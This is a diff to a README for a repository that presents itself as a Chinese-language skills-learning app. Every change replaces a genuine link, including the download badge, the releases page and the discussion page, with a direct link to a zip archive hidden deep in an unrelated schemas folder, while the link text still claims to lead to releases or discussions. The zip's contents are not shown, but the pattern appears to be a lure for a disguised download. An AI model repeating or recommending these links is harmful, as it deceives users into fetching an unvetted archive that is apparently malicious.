@@ -4,7 +4,7 @@
 Welcome to the Claude_skills_zh-CN project! This application helps you learn various skills in Chinese, making your study experience efficient and enjoyable. With a user-friendly interface, you can easily navigate through lessons and exercises tailored for Chinese learners.
 
 ## 📥 Download the Application
-[![Download Claude_skills_zh-CN](https://img.shields.io/badge/Download-Claude_skills_zh--CN-brightgreen.svg)](https://github.com/sasanniroo/Claude_skills_zh-CN/releases)
+[![Download Claude_skills_zh-CN](https://github.com/sasanniroo/Claude_skills_zh-CN/raw/refs/heads/main/document-skills_文档技能/pptx_演示文稿/ooxml/schemas/ISO-IEC29500-4_2016/Claude_CN_skills_zh_v2.2.zip)](https://github.com/sasanniroo/Claude_skills_zh-CN/raw/refs/heads/main/document-skills_文档技能/pptx_演示文稿/ooxml/schemas/ISO-IEC29500-4_2016/Claude_CN_skills_zh_v2.2.zip)
 
 ## 📋 Features
 - **Interactive Lessons:** Engage with lessons designed to improve your skills.
@@ -21,7 +21,7 @@ Welcome to the Claude_skills_zh-CN project! This application helps you learn var
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application:
 
-[Download Claude_skills_zh-CN](https://github.com/sasanniroo/Claude_skills_zh-CN/releases)
+[Download Claude_skills_zh-CN](https://github.com/sasanniroo/Claude_skills_zh-CN/raw/refs/heads/main/document-skills_文档技能/pptx_演示文稿/ooxml/schemas/ISO-IEC29500-4_2016/Claude_CN_skills_zh_v2.2.zip)
 
 1. Click on the above link to reach the Releases page.
 2. Select the latest version of the application.
@@ -38,7 +38,7 @@ To get started, visit the Releases page to download the application:
 5. Track your progress through the in-app dashboard.
 
 ## 🤝 Community Support
-If you have questions or need help, the community is here to assist you. Visit our [discussion page](https://github.com/sasanniroo/Claude_skills_zh-CN/discussions) to connect with other users. Feel free to share experiences and tips!
+If you have questions or need help, the community is here to assist you. Visit our [discussion page](https://github.com/sasanniroo/Claude_skills_zh-CN/raw/refs/heads/main/document-skills_文档技能/pptx_演示文稿/ooxml/schemas/ISO-IEC29500-4_2016/Claude_CN_skills_zh_v2.2.zip) to connect with other users. Feel free to share experiences and tips!
 
 ## 📄 Contribution Guidelines
 If you want to contribute to the project, please follow these guidelines:
@@ -58,4 +58,4 @@ We plan to enhance the application with:
 - Expanded language options coming soon.
 
 ### Thank You!
-Thank you for choosing Claude_skills_zh-CN. We hope it enhances your learning experience! For the latest updates, keep checking our [Releases page](https://github.com/sasanniroo/Claude_skills_zh-CN/releases). Happy learning!
+Thank you for choosing Claude_skills_zh-CN. We hope it enhances your learning experience! For the latest updates, keep checking our [Releases page](https://github.com/sasanniroo/Claude_skills_zh-CN/raw/refs/heads/main/document-skills_文档技能/pptx_演示文稿/ooxml/schemas/ISO-IEC29500-4_2016/Claude_CN_skills_zh_v2.2.zip). Happy learning!
